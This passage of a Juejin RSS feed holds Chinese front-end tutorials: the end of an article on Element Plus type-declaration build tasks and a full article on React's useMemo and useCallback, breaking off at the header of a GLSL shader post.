  <span class="hljs-keyword">const</span> sourceDir = path.<span class="hljs-title function_">join</span>(typesDir, <span class="hljs-string">'element-plus'</span>)
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">copy</span>(sourceDir, typesDir)
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">remove</span>(sourceDir)
}
</code></pre>
<h3 data-id="heading-1">打包类型文件</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/444415838aaa489298c605331b395a33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAganFxNjY2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768290765&amp;x-signature=Sea%2B1lu46tUrXPiDdheU07iXjgI%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a89f65a744814769b23ee6ddabc12be1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAganFxNjY2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768290765&amp;x-signature=hsfIi%2FIxQyZ5KGmQTt1kINQfMWk%3D" alt="image.png" loading="lazy"/></p>
<p>对于<code>npx vue-tsc -p tsconfig.web.json --declaration --emitDeclarationOnly --declarationDir dist/types</code>，<code>-p tsconfig.web.json</code>指定要使用的编译配置文件，<code>--declaration</code> 指定生成声明文件，<code>--emitDeclarationOnly</code>表示只生成声明文件不会进行代码编译，<code>--declarationDir dist/types</code>指定了输出目录</p>
<p>然后运行pnpm buid，可以看到生成了对应的类型文件</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/08a3495fd8324232908ebae7f3b3fc9b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAganFxNjY2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768290765&amp;x-signature=zVnoCc3poZs4zSNvrk9uWbmoz%2FU%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">重写类型文件</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/404a50a151204256bf9262579898fa6c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAganFxNjY2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768290765&amp;x-signature=QhDGdNKsHVLzaGVRc%2BePED4LiPc%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc22122a9a5a4b128b95c7db45ad780c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAganFxNjY2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768290765&amp;x-signature=Cv5yswWsp5likHTaECVlQ5d3CT0%3D" alt="image.png" loading="lazy"/></p>
<p>主要就是针对路径进行处理，把开发环境的路径处理成了打包之后的路径</p>
<p>重写类型文件之前 <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c6354add6c14d5b97d3e15f859b2793~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAganFxNjY2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768290765&amp;x-signature=JNkcWLpIn1amu4O9KaLYwfj3W%2FA%3D" alt="image.png" loading="lazy"/>
重写类型文件之后 <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68e25e5dfc594b69aab5fe2de33e8e3e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAganFxNjY2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768290765&amp;x-signature=wZcW6sjkUyBslcEJAKfH8uPTvY4%3D" alt="image.png" loading="lazy"/></p>
<p>可以看到这里import的是es文件目录下的类型文件，之前打包的es下面并没有对应的类型啊？？？其实后面还有处理，会把types的相关类型移动到对应目录下，需要往后面看 copyTypesDefinitions</p>
<h3 data-id="heading-3">提升package/element-plus的类型文件到上层</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eca21b1ffb014acba57f3b438991dab7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAganFxNjY2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768290765&amp;x-signature=9B5psrRlfzt4eWOvFfylPEoHu94%3D" alt="image.png" loading="lazy"/></p>
<p>我们之前打包的配置 <code>preserveModules</code> 值为 <code>true</code> 时，不会有element-plus的目录结构了，下面的文件会提升到上层。</p>
<p>这里就是为了把类型提到上层，使得其和之前的组件打包的结构一致</p>
<p>提升前：<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aaecec8fe93945c09fbb3b8e50177928~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAganFxNjY2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768290765&amp;x-signature=rcYoHQzB4xgjpwXMKOI%2B3csTOvM%3D" alt="image.png" loading="lazy"/></p>
<p>提升后：<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f645a8446df43ba8b294cfc9fbe952c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAganFxNjY2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768290765&amp;x-signature=wHq9RV9hA3XZPFDO4%2B2LTK8DnVM%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-4">copyTypesDefinitions</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c17e04476a374666911c9f03407312c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAganFxNjY2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768290765&amp;x-signature=cCV7eYEYt6LxtTeDhtqydQdzALU%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">copyTypesDefinitions</span>: <span class="hljs-title class_">TaskFunction</span> = <span class="hljs-function">(<span class="hljs-params">done</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> src = path.<span class="hljs-title function_">resolve</span>(buildOutput, <span class="hljs-string">'types'</span>, <span class="hljs-string">'packages'</span>)
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">copyTypes</span> = (<span class="hljs-params"><span class="hljs-variable language_">module</span>: Module</span>) =&gt;
    <span class="hljs-title function_">withTaskName</span>(<span class="hljs-string">`copyTypes:<span class="hljs-subst">${<span class="hljs-variable language_">module</span>}</span>`</span>, <span class="hljs-function">() =&gt;</span>
      <span class="hljs-title function_">copy</span>(src, buildConfig[<span class="hljs-variable language_">module</span>].<span class="hljs-property">output</span>.<span class="hljs-property">path</span>, { <span class="hljs-attr">recursive</span>: <span class="hljs-literal">true</span> })
    )

  <span class="hljs-keyword">return</span> <span class="hljs-title function_">parallel</span>(<span class="hljs-title function_">copyTypes</span>(<span class="hljs-string">'esm'</span>), <span class="hljs-title function_">copyTypes</span>(<span class="hljs-string">'cjs'</span>))(done)
}
</code></pre>
<p>这是要把types下面的各种文件，copy到es和lib的相关文件下</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/08ecd8831b404fa28535ed4f92b9aa14~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAganFxNjY2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768290765&amp;x-signature=B72ZfYg3IQdQOV7tXAw%2FBJX6PYE%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React 性能优化双子星：useMemo 与 useCallback 的正确打开方式]]></title>    <link>https://juejin.cn/post/7591948263860584486</link>    <guid>https://juejin.cn/post/7591948263860584486</guid>    <pubDate>2026-01-06T07:36:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591948263860584486" data-draft-id="7591948263860502566" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React 性能优化双子星：useMemo 与 useCallback 的正确打开方式"/> <meta itemprop="keywords" content="前端,JavaScript,React.js"/> <meta itemprop="datePublished" content="2026-01-06T07:36:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="陳陈陳"/> <meta itemprop="url" content="https://juejin.cn/user/3942169763381875"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React 性能优化双子星：useMemo 与 useCallback 的正确打开方式
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3942169763381875/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    陳陈陳
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T07:36:30.000Z" title="Tue Jan 06 2026 07:36:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">React 性能优化双子星：useMemo 与 useCallback 的正确打开方式</h2>
<blockquote>
<p><strong>“React 组件重渲染，就像你每次回家都要重新装修一遍——除非你知道怎么用 <code>useMemo</code> 和 <code>useCallback</code> 把门焊死。”</strong></p>
</blockquote>
<p>在大厂前端面试中，“如何优化 React 性能？”几乎是必问题。而 <code>useMemo</code> 与 <code>useCallback</code>，正是 React 官方钦定的性能优化“双子星”。<br/>
但很多人用错了——不是“用了没效果”，就是“过度优化反被优化”。</p>
<p>今天，我们就从两段真实代码出发，<strong>深入原理、拆解陷阱、直击面试考点</strong>，带你彻底掌握这两个 Hook 的正确使用姿势。</p>
<hr/>
<h3 data-id="heading-1">🔥 问题引入：为什么我的子组件总在“无意义”地重渲染？</h3>
<p>想象一个典型场景：</p>
<ul>
<li>父组件维护两个状态：<code>count</code>（计数器）和 <code>num</code>（另一个无关状态）</li>
<li>子组件只依赖 <code>count</code> 和一个点击回调</li>
<li>但当你点击“+1 num”按钮时，子组件居然也重新渲染了！</li>
</ul>
<p>这不仅浪费性能，还可能触发不必要的副作用（比如重复请求、动画重置等）。<strong>问题出在哪？</strong></p>
<p>答案就藏在 JavaScript 的 <strong>引用相等性（Reference Equality）</strong> 机制里。</p>
<hr/>
<h3 data-id="heading-2">🧠 核心概念：React 的“浅比较”与 <code>memo</code> 的局限</h3>
<p>React 函数组件默认会在父组件更新时<strong>整体重执行</strong>。为了优化，我们常用 <code>React.memo</code> 包裹子组件：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Child</span> = <span class="hljs-title function_">memo</span>(<span class="hljs-function">(<span class="hljs-params">{ count, handleClick }</span>) =&gt;</span> { ... })
</code></pre>
<p><code>memo</code> 的作用是：<strong>仅当 props 的引用发生变化时，才触发子组件重渲染</strong>。它内部使用的是<strong>浅比较（shallow comparison）</strong> 。</p>
<p>但问题来了：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClick</span> = (<span class="hljs-params"/>) =&gt; { <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'click'</span>); }
<span class="hljs-comment">// 每次父组件重渲染，handleClick 都是一个全新的函数！</span>
</code></pre>
<p>在 JavaScript 中，即使两个函数逻辑完全一致，它们的引用也不相等：</p>
<pre><code class="hljs language-scss" lang="scss">() =&gt; {} === () =&gt; {} <span class="hljs-comment">// false</span>
</code></pre>
<p>于是，哪怕 <code>count</code> 没变，只要父组件因 <code>num</code> 更新，<code>handleClick</code> 引用变了 → <code>memo</code> 判定 props 变了 → 子组件重渲染 ❌</p>
<p><strong>这就是 <code>useCallback</code> 登场的理由。</strong></p>
<hr/>
<h3 data-id="heading-3">🔍 源码逐行解析：<code>useCallback</code> 如何“冻结”函数引用</h3>
<p>看第一段代码的关键部分：</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">handleClick</span> = useCallback(() =&gt; {
  console.log('click')<span class="hljs-comment">;</span>
}, <span class="hljs-section">[count]</span>)<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-4">✅ 功能目的</h4>
<p>缓存函数引用，仅在依赖项（如 <code>count</code>）变化时生成新函数。</p>
<h4 data-id="heading-5">⚙️ 执行上下文</h4>
<ul>
<li><code>useCallback(fn, deps)</code> 本质是 <code>useMemo(() =&gt; fn, deps)</code> 的语法糖。</li>
<li>React 会将该函数缓存在当前 Fiber 节点的 hooks 链表中。</li>
<li>下次渲染时，若依赖数组浅比较相等，则直接返回上一次缓存的函数引用。</li>
</ul>
<h4 data-id="heading-6">🎯 依赖数组 <code>[count]</code> 的深意</h4>
<p>这里有个<strong>经典陷阱</strong>：虽然当前 <code>handleClick</code> 体内没用到 <code>count</code>，但如果未来你添加了类似 <code>console.log(count)</code> 的逻辑，却忘了更新依赖，就会掉进 <strong>Stale Closure（闭包过期）</strong> 的坑——函数始终捕获旧的 <code>count</code> 值。</p>
<blockquote>
<p>💡 <strong>最佳实践</strong>：依赖数组必须包含函数体内所有用到的响应式变量（state / props / 其他 callbacks）。</p>
</blockquote>
<h4 data-id="heading-7">🔄 对比：不用 <code>useCallback</code> 的后果</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ❌ 每次父组件渲染都新建函数 → 引用变化</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClick</span> = (<span class="hljs-params"/>) =&gt; { ... }

<span class="hljs-comment">// ✅ 引用稳定 → 子组件可安全使用 memo</span>
<span class="hljs-keyword">const</span> handleClick = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> { ... }, [])
</code></pre>
<hr/>
<h3 data-id="heading-8">🧮 <code>useMemo</code>：不只是“缓存计算”，更是“避免副作用”</h3>
<p>再看第二段代码：</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">filterList</span> = useMemo(() =&gt; {
  return list.filter(<span class="hljs-attr">item</span> =&gt; item.includes(keyword))
}, <span class="hljs-section">[keyword]</span>)
</code></pre>
<h4 data-id="heading-9">❓ 为什么需要 <code>useMemo</code>？</h4>
<p>因为：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> filterList = list.<span class="hljs-built_in">filter</span>(...) <span class="hljs-comment">// 每次组件重渲染都会执行！</span>
</code></pre>
<p>即使 <code>keyword</code> 没变，只要 <code>count</code> 更新，整个组件函数重跑 → <code>filter</code> 重执行 → 控制台疯狂打印 “filter 执行”。</p>
<p><strong><code>useMemo</code> 的作用</strong>：仅当 <code>keyword</code> 变化时，才重新计算过滤结果。</p>
<h4 data-id="heading-10">⚠️ <code>includes("")</code> 的隐藏行为</h4>
<p>注意：<code>"apple".includes("")</code> 返回 <code>true</code>！这意味着当输入框为空字符串时，所有列表项都会匹配——这通常是预期行为，但务必心中有数。</p>
<h4 data-id="heading-11">💰 昂贵计算的救星：<code>slowSum</code></h4>
<pre><code class="hljs language-scss" lang="scss">const result = <span class="hljs-built_in">useMemo</span>(() =&gt; <span class="hljs-built_in">slowSum</span>(num), <span class="hljs-selector-attr">[num]</span>);
</code></pre>
<p><code>slowSum</code> 是一个 O(n) 的耗时操作（千万次循环）。若不用 <code>useMemo</code>，每次 <code>count</code> 改变都会触发一次卡顿级计算，UI 直接“冻住”。</p>
<p><strong>在这里，<code>useMemo</code> 不仅是优化，更是用户体验的保障。</strong></p>
<hr/>
<h3 data-id="heading-12">🤔 深度追问：<code>useCallback</code> 和 <code>useMemo</code> 真的免费吗？</h3>
<p><strong>不，它们也有成本：</strong></p>
<ol>
<li><strong>内存开销</strong>：React 需要存储缓存值或函数；</li>
<li><strong>比较开销</strong>：每次渲染都要对依赖数组做浅比较；</li>
<li><strong>心智负担</strong>：错误的依赖可能导致 bug 或内存泄漏。</li>
</ol>
<h4 data-id="heading-13">✅ 何时该用？一张表说清楚</h4>

























<table><thead><tr><th>场景</th><th>是否推荐</th></tr></thead><tbody><tr><td>传递给 <code>memo</code> 子组件的回调函数</td><td>✅ 必用 <code>useCallback</code></td></tr><tr><td>昂贵计算（大数据过滤、复杂公式等）</td><td>✅ 必用 <code>useMemo</code></td></tr><tr><td>简单计算（如 <code>a + b</code>）</td><td>❌ 不要用，得不偿失</td></tr><tr><td>函数未传递给子组件</td><td>❌ 通常无需缓存</td></tr></tbody></table>
<blockquote>
<p>📌 <strong>阿里 P7 面试官常问</strong>：“<code>useMemo</code> 能否用于创建对象或数组以避免子组件重渲染？”<br/>
<strong>答</strong>：可以，但更推荐将整个 props 对象用 <code>useMemo</code> 包装，或结合 <code>React.memo</code> + <code>useCallback</code> 组合拳。</p>
</blockquote>
<hr/>
<h3 data-id="heading-14">🧩 知识拓展：背后的 React 渲染机制</h3>
<h4 data-id="heading-15">1. <strong>React 的协调（Reconciliation）过程</strong></h4>
<ul>
<li>组件更新 → 生成新的 React Element 树 → 与旧树 diff → 找出最小变更 → 更新 DOM。</li>
<li>若子组件被 <code>memo</code> 包裹且 props 引用未变 → <strong>跳过该子树的 diff</strong>，性能提升显著。</li>
</ul>
<h4 data-id="heading-16">2. <strong>闭包陷阱（Stale Closure）</strong></h4>
<pre><code class="hljs language-scss" lang="scss">const handleClick = <span class="hljs-built_in">useCallback</span>(() =&gt; {
  console<span class="hljs-selector-class">.log</span>(count); <span class="hljs-comment">// 如果依赖是 []，永远输出初始值 0！</span>
}, <span class="hljs-selector-attr">[]</span>); <span class="hljs-comment">// ❌ 错误依赖</span>
</code></pre>
<p>这是典型的 stale closure 问题。React 官方甚至为此推出了 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Feslint-plugin-react-hooks" target="_blank" title="https://www.npmjs.com/package/eslint-plugin-react-hooks" ref="nofollow noopener noreferrer"><code>eslint-plugin-react-hooks</code></a> 插件自动检测依赖缺失。</p>
<h4 data-id="heading-17">3. <strong><code>useCallback</code> vs <code>useMemo</code> 的本质</strong></h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// useCallback 就是 useMemo 的特例</span>
<span class="hljs-built_in">useCallback</span>(fn, deps) ≡ <span class="hljs-built_in">useMemo</span>(() =&gt; fn, deps)
</code></pre>
<p>所以，<code>useCallback</code> 并非魔法，只是语义更清晰、意图更明确。</p>
<hr/>
<h3 data-id="heading-18">💼 面试关联：大厂高频考点</h3>






























<table><thead><tr><th>公司</th><th>面试题</th><th>考察点</th></tr></thead><tbody><tr><td>字节</td><td>“<code>useMemo</code> 和 <code>useEffect</code> 有什么区别？”</td><td>缓存 vs 副作用执行时机</td></tr><tr><td>腾讯</td><td>“如何避免子组件不必要的渲染？”</td><td><code>memo</code> + <code>useCallback</code> + 依赖管理</td></tr><tr><td>阿里</td><td>“<code>useCallback</code> 能解决所有性能问题吗？”</td><td>理解其局限性（如无法阻止父组件自身重渲染）</td></tr><tr><td>美团</td><td>“依赖数组写错会有什么后果？”</td><td>stale closure / 内存泄漏 / 逻辑错误</td></tr></tbody></table>
<p><strong>答题思路建议</strong>：先描述业务场景 → 引出性能问题 → 介绍工具方案 → 分析底层原理 → 指出常见陷阱 → 给出工程化最佳实践。</p>
<hr/>
<h3 data-id="heading-19">✅ 总结与最佳实践</h3>
<ol>
<li><strong><code>useCallback</code> 用于缓存函数引用</strong>，配合 <code>React.memo</code> 阻止子组件无效重渲染；</li>
<li><strong><code>useMemo</code> 用于缓存计算结果</strong>，避免昂贵操作或副作用重复执行；</li>
<li><strong>依赖数组必须完整且准确</strong>，强烈建议启用 ESLint 的 <code>react-hooks/exhaustive-deps</code> 规则；</li>
<li><strong>不要过度优化</strong>：简单计算、未传递的函数无需缓存；</li>
<li><strong>性能优化的前提是性能分析</strong>：先用 React DevTools Profiler 定位瓶颈，再针对性优化。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[着色器 (Shader) 的基本概念和 GLSL 语法 笔记]]></title>    <link>https://juejin.cn/post/7591861857466171430</link>    <guid>https://juejin.cn/post/7591861857466171430</guid>    <pubDate>2026-01-06T06:59:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591861857466171430" data-draft-id="7591948263860289574" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="着色器 (Shader) 的基本概念和 GLSL 语法 笔记"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-01-06T06:59:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="心源xinyuan"/> <meta itemprop="url" content="https://juejin.cn/user/4283353029151694"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            着色器 (Shader) 的基本概念和 GLSL 语法 笔记
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4283353029151694/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    心源xinyuan
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T06:59:12.000Z" title="Tue Jan 06 2026 06:59:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
